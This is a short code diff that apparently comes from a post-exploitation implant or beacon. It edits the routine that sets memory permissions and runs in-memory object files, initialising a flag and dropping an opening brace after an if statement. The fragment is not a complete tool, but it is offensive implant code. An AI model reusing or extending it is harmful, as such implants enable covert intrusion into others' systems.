@@ -782,7 +782,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	{
 		DWORD oldp = 0;
 		DWORD codeperm = (DWORD)setting_short(SETTING_PROCINJ_PERMS);
-		BOOL perms_ok;
+		BOOL perms_ok = TRUE;
 		if (codeperm == 0 || codeperm == (DWORD)setting_short(SETTING_PROCINJ_PERMS_I))
 			codeperm = PAGE_EXECUTE_READ;
 		perms_ok = VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
@@ -790,7 +790,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
 		if (!perms_ok)
 			post_error_d(0x11, (int)GetLastError());
-		if (perms_ok) {
+		if (perms_ok)
 			if (conv == 1) {
 				DWORD t = 0;
 				BEACON_INFO info;
